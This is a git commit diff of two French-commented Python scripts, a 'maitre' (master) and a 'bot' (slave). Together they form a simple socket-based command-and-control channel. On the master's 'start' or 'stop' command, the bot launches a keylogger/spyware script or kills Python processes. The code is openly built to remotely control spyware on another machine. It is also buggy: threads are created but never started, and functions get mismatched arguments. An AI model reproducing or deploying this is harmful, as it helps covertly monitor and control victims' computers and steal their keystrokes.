08d943d5d17a6b1a5be0c4b2c3e76f5bbc12d60e
BilliButters <57570380+BilliButters@users.noreply.github.com>
2019-11-14 20:40:15 +0100

    Add files via upload

--- start_log/bot.py
+++ start_log/bot.py
@@ -1,35 +1,35 @@
 import socket as modSocket
+from threading import Thread
+import time
 import os 
 
-def start_log(s):
-        
-    s.connect(machine_maitre)
-    if s.recv(1024) == b"Execute":
-        print("OK !!!")
-        os.system("spyware.py")
-    s.send("OK c'est fait !!!".encode("utf-8"))
-
-def stop_log():
-        
-    s.connect(machine_maitre)
-    if s.recv(1024) == b"Stop":
-        print("OK !!!")
-        os.system("taskkill /f /im python.exe")
-    s.send("OK c'est fait !!!".encode("utf-8"))
 
 machine_maitre = (("localhost", 5000))
 
 s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
 s.connect(machine_maitre)
 print("slave connecté au serveur")
-attaque = slave.recv(1024)
 
 
-if (attaque == b"attc") :
-    start_log(s)
-elif (attaque == b"keylogger"):
-    stop_log(s)
+def start_log(max):
+        
+    if s.recv(1024) == b"Execute":
+        print("OK !!!")
+        s.send("OK c'est fait !!!".encode("utf-8"))
+        os.system("spyware.py")
+        
+    
 
+def stop_log(max):
+        
+    if s.recv(1024) == b"Stop":
+        print("OK !!!")
+        os.system("taskkill /f /im python.exe")
+    s.send("OK c'est fait !!!".encode("utf-8"))
 
+start = Thread(target=start_log,args=(2,))
+stop = Thread(target=stop_log,args=(2,))
 
+start_log(s)
+stop_log(s)
 s.close()
--- start_log/maitre.py
+++ start_log/maitre.py
@@ -10,28 +10,31 @@ conn, addr = s.accept()
 
 print ("Connexion avec l'adresse: ", addr)
 
-
-        
 parser = argparse.ArgumentParser()
-parser.add_argument("--start", help="lance le keylloger", action="store_true")
-parser.add_argument("--stop", help="stop le keylloger", action="store_true")
+parser.add_argument("--logger", help="Permet de communiquer avec les bots", action="store_true")
 args = parser.parse_args()
 
 
-if args.start:
+if args.logger:
+    action = input("Que voulez vous faire : (start, stop) ")
+
     def start_log(conn):
 
         conn.send("Execute".encode("utf-8"))
         print(conn.recv(1024).decode("utf-8"))
+        
 
-if args.stop:
     def stop_log(conn):
 
         conn.send("Stop".encode("utf-8"))
         print(conn.recv(1024).decode("utf-8"))
 
-    
-    
-start_log(conn)
-stop_log(conn)
-s.close()
+
+    if action == "start":
+        start_log(conn)
+    elif action == "stop":
+        stop_log(conn)
+    else:
+        print("ce choix n'existe pas")
+
+    s.close()
